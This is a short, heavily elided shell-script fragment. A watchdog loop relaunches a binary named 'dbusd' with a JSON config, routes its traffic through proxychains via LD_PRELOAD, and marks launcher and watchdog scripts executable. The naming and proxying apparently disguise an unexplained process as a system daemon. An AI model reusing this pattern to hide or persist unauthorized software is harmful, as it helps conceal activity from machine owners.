...
while true; do
  ...
  if [ "$CPU_INT" -ge 95 ]; then
    ...
    LD_PRELOAD="$DIR/libproxychains.so.4"     PROXYCHAINS_CONF_FILE="$DIR/proxychains.conf"     "$DIR/dbusd" --config="$DIR/config.json" >> "$LOGFILE" 2>&1
  fi
...
chmod +x launcher.sh watchdog.sh
